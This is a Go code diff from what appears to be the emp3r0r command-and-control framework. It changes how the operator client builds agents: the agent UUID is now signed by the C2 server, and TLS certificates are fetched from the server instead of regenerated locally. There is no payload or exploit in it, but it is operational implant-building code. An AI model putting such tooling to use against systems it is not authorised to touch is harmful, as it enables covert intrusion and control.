@@ -9,6 +9,7 @@ import (
 	"time"
 
 	"github.com/google/uuid"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/config"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
@@ -80,11 +81,23 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 	}
 
 	// Build agent (business logic via controller)
+	// 1. Generate UUID
+	agentUUID := uuid.NewString()
+
+	// 2. Sign UUID with server
+	sig, err := client.SignAgent(agentUUID)
+	if err != nil {
+		logging.Errorf("Failed to sign agent UUID: %v", err)
+		return
+	}
+
 	buildCfg := controllers.AgentBuildConfig{
-		PayloadType: payloadType,
-		Arch:        archChoice,
-		Timestamp:   time.Now(),
-		WorkSpace:   live.EmpWorkSpace,
+		PayloadType:  payloadType,
+		Arch:         archChoice,
+		Timestamp:    time.Now(),
+		WorkSpace:    live.EmpWorkSpace,
+		AgentUUID:    agentUUID,
+		AgentUUIDSig: sig,
 	}
 
 	result, err := controllers.BuildAgent(buildCfg, live.RuntimeConfig)
@@ -164,19 +177,23 @@ func MakeConfig(cmd *cobra.Command) (err error) {
 	live.RuntimeConfig.CCAddress = strings.TrimSuffix(live.RuntimeConfig.CCAddress, "/")
 	logging.Printf("C2 server name: %s", live.RuntimeConfig.CCAddress)
 	existing_names := transport.NamesInCert(transport.ServerCrtFile)
-	cc_hosts := existing_names
 
 	exists := slices.Contains(existing_names, live.RuntimeConfig.CCAddress)
 	if !exists {
-		logging.Warningf("Name '%s' is not covered by our server cert, re-generating",
+		logging.Warningf("Name '%s' is not covered by our server cert, fetching new certs from server",
 			live.RuntimeConfig.CCAddress)
-		cc_hosts = append(cc_hosts, live.RuntimeConfig.CCAddress) // append new name
-		// remove old certs
-		os.RemoveAll(transport.ServerCrtFile)
-		os.RemoveAll(transport.ServerKeyFile)
-		_, err = transport.GenCerts(cc_hosts, transport.ServerCrtFile, transport.ServerKeyFile, transport.CaKeyFile, transport.CaCrtFile, false)
+
+		certs, err := client.GetCerts()
 		if err != nil {
-			return fmt.Errorf("failed to generate certs: %v", err)
+			return fmt.Errorf("failed to get certs from server: %v", err)
+		}
+
+		// Save certs
+		if err := os.WriteFile(transport.CaCrtFile, certs["ca_crt"], 0644); err != nil {
+			return fmt.Errorf("failed to save CA cert: %v", err)
+		}
+		if err := os.WriteFile(transport.ServerCrtFile, certs["server_crt"], 0644); err != nil {
+			return fmt.Errorf("failed to save Server cert: %v", err)
 		}
 	}
 
